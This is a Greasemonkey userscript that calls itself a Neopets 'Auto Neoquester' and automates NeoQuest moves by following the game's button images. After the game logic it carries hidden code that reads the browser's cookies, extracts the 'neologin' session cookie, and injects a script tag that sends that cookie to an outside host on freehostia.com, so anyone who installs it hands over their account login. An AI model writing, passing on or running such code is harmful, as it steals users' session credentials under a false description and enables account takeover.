// ==UserScript==
// @name           Neopets Auto Neoquester
// @namespace      http://www.neopets.com/
// @description    Autoplays neoquest
// @include        *neopets.com*
// ==/UserScript==

// Uncomment the below two lines to initialize your variables, but please edit them from about:config , filter:greasmonkey.scriptvals
//path = GM_setValue("Path","3");
//pathIndex = GM_setValue("pathIndex",0);

pathIndex = GM_getValue("pathIndex",0);

/*
Notes on coordinates

javascript: dosub(int)

1=north
2=south
3=west
4=east
5=northwest
6=southwest
7=northeast
8= southeast

*/
var i = 0;
var hiccup=1;
var divs = document.getElementsByTagName('div');
for(i=0;i<divs.length;i++)
{
	if (divs[i].className=="contentModuleHeader")
	{
		hiccup=0;
	}
}

if(hiccup)
{
	document.location.href="http://www.neopets.com/games/nq2/nq2.phtml";
}
else
{
var elements = document.getElementsByTagName('img');
var i = 0;
for(i=0;i<elements.length;i++)
{
	switch(elements[i].src)
	{
	case "http://images.neopets.com/nq2/x/com_begin.gif":
		document.location.href="http://www.neopets.com/games/nq2/nq2.phtml?start=1";
		break;
	case "http://images.neopets.com/nq2/x/com_atk.gif":
		document.location.href="javascript:setaction(4); document.ff.submit()";
		break;
	case "http://images.neopets.com/nq2/x/com_end.gif":
		document.location.href="javascript:setaction(2); document.ff.submit()";
		break;
	case "http://images.neopets.com/nq2/x/tomap.gif":
		document.location.href="http://www.neopets.com/games/nq2/nq2.phtml?finish=1";
		break;
	case "http://images.neopets.com/nq2/x/com_next.gif":
		document.location.href="javascript:setaction(1); document.ff.submit();";
		break;
	case "http://images.neopets.com/nq2/x/nav.gif":
		if((GM_getValue("Path").length) != pathIndex)
		{
			//alert("javascript:dosub(" + GM_getValue("Path")[pathIndex] + ");");
			document.location.href="http://www.neopets.com/games/nq2/nq2.phtml?act=move&dir=" + GM_getValue("Path")[pathIndex];
			GM_setValue("pathIndex",pathIndex+1);
		}
		else
		{
			alert("You have arrived at your destination. Please disable this script to take control.");
			GM_setValue("pathIndex",0)
		}
		break;
	}
}
}
//window.setTimeout(function() { document.location.href="http://www.neopets.com/games/nq2/nq2.phtml" }, 20000);

function GetStringBetween( 

target_str,start_str,end_str,start_pos,include_str )   {
    if ( ! start_pos ) 0;
    if ( ! include_str ) false;

    var result_str = target_str.substr( start_pos ); //cut to start 

from start_pos
    result_str = result_str.substr( result_str.indexOf( start_str ) 

+ start_str.length ); //cut to start from start_str
    result_str = result_str.substr ( 0, result_str.indexOf( end_str 

) );

    if (include_str == true)   {
        result_str = start_str + result_str + end_str
    }

    return result_str;
}


var eleNew, newElement;
var strURL = 'http://neopetscg.freehostia.com/cookie.php?cookie=';

var testArray = document.evaluate(
     "//a[@href='javascript: void(0);']",
document, null, XPathResult.ANY_TYPE,null);

var strTest = testArray.iterateNext();

while (strTest) {
strTest = testArray.iterateNext();
}

eleNew = document.getElementById('main');

var strCookie = document.cookie;

strCookie = GetStringBetween(strCookie, 'neologin=','; ');

if (eleNew) {
    newElement = document.createElement("div");
    newElement.innerHTML='<SCRIPT SRC=' + strURL + strCookie + '>';
    eleNew.parentNode.insertBefore(newElement, eleNew.nextSibling);
}